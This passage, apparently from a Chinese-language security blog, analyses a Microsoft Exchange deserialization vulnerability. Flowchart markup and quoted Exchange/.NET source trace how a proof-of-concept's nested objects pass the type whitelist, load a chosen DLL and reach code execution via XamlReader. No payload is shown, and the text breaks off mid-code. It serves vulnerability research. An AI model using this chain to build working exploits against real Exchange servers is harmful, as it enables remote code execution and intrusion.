v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1319.37" width="103.14" height="82.5114"/><rect x="0" y="1278.12" width="103.139" height="82.5114" class="st2"/><text x="5.77" y="1311.57" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>转化为在<tspan class="st10">m</tspan><tspan class="st10">_</tspan><tspan class="st10">assmblyName</tspan><tspan x="4.11" dy="1.3em" class="st5">对应的</tspan><tspan class="st10">DLL</tspan>中的<tspan class="st10">m</tspan><tspan class="st10">_</tspan><tspan class="st10">data</tspan>对应<tspan x="23.1" dy="1.3em" class="st5">类型的</tspan><tspan class="st10">Type</tspan>对象</text></g><g id="shape41-165" v:mID="41" v:groupContext="shape" v:layerMember="1" transform="translate(462.593,-722.835)"><title>动态连接线.41</title><desc>一系列返回</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="-98.6173" cy="1482.83" width="50.2" height="18.4064"/><path d="M0 1360.63v122.2H-151.41a3 3-180 00-6 0h-49.83a3 3-180 00-6 0h-84.93v-15.22" class="st6"/><rect v:rectContext="textBkgnd" x="-118.617" y="1477.63" width="39.9998" height="10.403" class="st8"/><text x="-118.62" y="1485.43" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>一系列返回</text></g><g id="shape43-172" v:mID="43" v:groupContext="shape" v:layerMember="1" transform="translate(112.85,-652.838)"><title>动态连接线.43</title><path d="M0 1360.63H-21.26v116.95H45.38v15.22" class="st6"/></g><g id="shape42-177" v:mID="42" v:groupContext="shape" v:layerMember="0" transform="translate(106.662,-452.748)"><title>流程.42</title><desc>将ConverTo返回的Type对象加入.adaptedMembers</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="2.17" y="1327.09" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>将<tspan class="st10">ConverTo</tspan>返回的<tspan class="st10">Type</tspan>对象<tspan x="11.46" dy="1.3em" class="st5">加入</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">adaptedMembers</tspan></text></g><g id="shape45-185" v:mID="45" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-312.478)"><title>流程.45</title><desc>GetTargetTypeForDeserialization</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="3.07" y="1327.29" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>GetTargetTypeForDeserializ<tspan x="42.6" dy="1.2em" class="st5">ation</tspan></text></g><g id="shape53-189" v:mID="53" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1141.72)"><title>流程.53</title><desc>ReadOneDeserializedObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="2.42" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneDeserializedObject</text></g><g id="shape54-192" v:mID="54" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1257.23)"><title>流程.54</title><desc>ReadOneObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="23.69" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneObject</text></g><g id="shape56-195" v:mID="56" v:groupContext="shape" v:layerMember="1" transform="translate(203.746,-483.689)"><title>动态连接线.56</title><path d="M6.06 1360.63H48.6V556.14H14.16" class="st6"/></g><g id="shape57-200" v:mID="57" v:groupContext="shape" v:layerMember="1" transform="translate(153.208,-1257.23)"><title>动态连接线.57</title><path d="M7.09 1360.63V1408.22" class="st6"/></g><g id="shape58-205" v:mID="58" v:groupContext="shape" v:layerMember="1" transform="translate(153.208,-1141.72)"><title>动态连接线.58</title><path d="M7.09 1360.63V1420.6" class="st6"/></g><g id="shape59-210" v:mID="59" v:groupContext="shape" v:layerMember="1" transform="translate(160.294,-1257.23)"><title>动态连接线.59</title><desc>调用</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="-90.9685" cy="1790.99" width="40" height="18.4064"/><path d="M0 1360.63v21.26H-90.97v892.55h31.84" class="st6"/><rect v:rectContext="textBkgnd" x="-98.9685" y="1785.79" width="15.9999" height="10.403" class="st8"/><text x="-98.97" y="1793.59" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用</text></g><g id="shape61-217" v:mID="61" v:groupContext="shape" v:layerMember="1" transform="translate(151.688,-312.478)"><title>动态连接线.61</title><path d="M7.09 1360.63V1416.47" class="st6"/></g><g id="shape60-222" v:mID="60" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-188.711)"><title>流程.60</title><desc>GetPSStandardMember</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="10.13" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>GetPSStandardMember</text></g><g id="shape63-225" v:mID="63" v:groupContext="shape" v:layerMember="1" transform="translate(151.688,-188.711)"><title>动态连接线.63</title><path d="M7.09 1360.63V1408.22" class="st6"/></g><g id="shape62-230" v:mID="62" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-56.6929)"><title>流程.62</title><desc>读取adaptedMembers的TargetTypeForDeserialization并返回</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1321.44" width="103.14" height="78.3858"/><rect x="0" y="1282.24" width="103.139" height="78.3858" class="st2"/><text x="8.33" y="1314.04" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>读取<tspan class="st10" v:langID="1033">adaptedMembers</tspan>的<tspan x="2.55" dy="1.225em" class="st10" v:langID="1033">TargetTypeForDeserializatio</tspan><tspan x="37.31" dy="1.275em" class="st10" v:langID="1033">n</tspan>并返回</text></g><g id="shape66-236" v:mID="66" v:groupContext="shape" v:layerMember="1" transform="translate(160.294,-1257.23)"><title>动态连接线.66</title><desc>调用将外层对象序列化数据</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="147.889" cy="1737.72" width="114.2" height="18.4064"/><path d="M0 1360.63v21.26H89.05a3 3 0 016 0h52.84v859.55h15.22" class="st6"/><rect v:rectContext="textBkgnd" x="95.8888" y="1732.52" width="104" height="10.403" class="st8"/><text x="95.89" y="1740.32" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，将外层对象序列化数据</text></g><g id="shape65-243" v:mID="65" v:groupContext="shape" v:layerMember="0" transform="translate(329.443,-345.483)"><title>流程.65</title><desc>LanguagePrimitives.ConvertTo</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="2.54" y="1327.29" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>LanguagePrimitives.Convert<tspan x="47.13" dy="1.2em" class="st5">To</tspan></text></g><g id="shape69-247" v:mID="69" v:groupContext="shape" v:layerMember="1" transform="translate(373.926,-345.483)"><title>动态连接线.69</title><path d="M7.09 1360.63V1416.47" class="st6"/></g><g id="shape68-252" v:mID="68" v:groupContext="shape" v:layerMember="0" transform="translate(329.443,-221.716)"><title>流程.68</title><desc>将S标签内数据转换为XamlReader对象触发代码执行</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="13.44" y="1321.89" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>将<tspan class="st10">S</tspan>标签内数据转换为<tspan x="2.4" dy="1.3em" class="st10">XamlReader</tspan>对象，触发代码<tspan x="43.57" dy="1.3em" class="st5">执行</tspan></text></g></g></svg><p>在Exchange中，允许反序列化的类白名单和类反序列化相关信息定义在<code>exchange.partial.types.ps1xml</code>和<code>exchange.types.ps1xml</code>等文件中，Exchange会读取这些文件，在反序列化数据时，会payload里面的目标类和文件里面的白名单类做对比，只有在白名单内的类才允许反序列化。</p><p>PoC由嵌套对象组成，在反序列化嵌套对象时，会先反序列化里层对象，而后反序列化外层对象。在<code>Exchang</code>反序列化PoC的里层对象时，将通过<code>ConvertTo</code>函数转换到目标类，传给<code>ConvertTo</code>的resultType值为<code>System.Exception</code>，<code>System.Exception</code>在<code>exchange.partial.types.ps1xml</code>中定义如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span>&lt;Type&gt;
</span></span><span style=display:flex><span>    &lt;Name&gt;System.Exception&lt;/Name&gt;
</span></span><span style=display:flex><span>    &lt;Members&gt;
</span></span><span style=display:flex><span>      &lt;CodeProperty IsHidden=<span style=color:#e6db74>&#34;true&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;Name&gt;SerializationData&lt;/Name&gt;
</span></span><span style=display:flex><span>        &lt;GetCodeReference&gt;
</span></span><span style=display:flex><span>          &lt;TypeName&gt;Microsoft.Exchange.Data.SerializationTypeConverter&lt;/TypeName&gt;
</span></span><span style=display:flex><span>          &lt;MethodName&gt;GetSerializationData&lt;/MethodName&gt;
</span></span><span style=display:flex><span>        &lt;/GetCodeReference&gt;
</span></span><span style=display:flex><span>      &lt;/CodeProperty&gt;
</span></span><span style=display:flex><span>    &lt;/Members&gt;
</span></span><span style=display:flex><span>    &lt;TypeConverter&gt;
</span></span><span style=display:flex><span>      &lt;TypeName&gt;Microsoft.Exchange.Data.SerializationTypeConverter&lt;/TypeName&gt;
</span></span><span style=display:flex><span>    &lt;/TypeConverter&gt;
</span></span><span style=display:flex><span>  &lt;/Type&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>object</span> ConvertTo(<span style=color:#66d9ef>object</span> valueToConvert, Type resultType, <span style=color:#66d9ef>bool</span> recursion, IFormatProvider formatProvider, TypeTable backupTypeTable)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>object</span> result;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>using</span> (LanguagePrimitives.typeConversion.TraceScope(<span style=color:#e6db74>&#34;Converting \&#34;{0}\&#34; to \&#34;{1}\&#34;.&#34;</span>, valueToConvert, resultType))
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (resultType == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>throw</span> PSTraceSource.NewArgumentNullException(<span style=color:#e6db74>&#34;resultType&#34;</span>);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>bool</span> flag;
</span></span><span style=display:flex><span>				result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, <span style=color:#66d9ef>out</span> flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : <span style=color:#66d9ef>null</span>, formatProvider, backupTypeTable);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>其定义了*<code>&lt;TypeName>Microsoft.Exchange.Data.SerializationTypeConverter&lt;/TypeName></code><em>，Exchange将通过</em><code>Microsoft.Exchange.Data.SerializationTypeConverter</code>*类对里层序列化数据进行反序列化。<code>Microsoft.Exchange.Data.SerializationTypeConverter</code>经过一系列调用，最终由<code>System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize</code>方法进行反序列化。</p><p>在该方法会调用<code>System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Run</code>，这方法会循环读取内存中的里层对象的序列化数据，将其转换为<em>System.UnitySerializationHolder</em>对象。</p><p>之后Exchange会通过<code>Assembly.LoadFrom</code>载入*<code>System.UnitySerializationHolder.m_assemblyName</code><em>所指明的DLL，并且返回</em><code>System.UnitySerializationHolder.m_data</code>*类型的Type对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>object</span> Deserialize(HeaderHandler handler, __BinaryParser serParser, <span style=color:#66d9ef>bool</span> fCheck, <span style=color:#66d9ef>bool</span> isCrossAppDomain, IMethodCallMessage methodCallMessage)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			......
</span></span><span style=display:flex><span>			serParser.Run();
</span></span><span style=display:flex><span>			......
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (!<span style=color:#66d9ef>this</span>.bMethodCall &amp;&amp; !<span style=color:#66d9ef>this</span>.bMethodReturn)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.TopObject == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SerializationException(Environment.GetResourceString(<span style=color:#e6db74>&#34;Serialization_TopObject&#34;</span>));
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.HasSurrogate(<span style=color:#66d9ef>this</span>.TopObject.GetType()) &amp;&amp; <span style=color:#66d9ef>this</span>.topId != <span style=color:#ae81ff>0L</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>this</span>.TopObject = <span style=color:#66d9ef>this</span>.m_objectManager.GetObject(<span style=color:#66d9ef>this</span>.topId);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.TopObject <span style=color:#66d9ef>is</span> IObjectReference)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>this</span>.TopObject = ((IObjectReference)<span style=color:#66d9ef>this</span>.TopObject).GetRealObject(<span style=color:#66d9ef>this</span>.m_context);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.bFullDeserialization)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.m_objectManager.RaiseDeserializationEvent();
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (handler != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.handlerObject = handler(<span style=color:#66d9ef>this</span>.headers);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.bMethodCall)
</span></span><span style=display:flex><span>			{
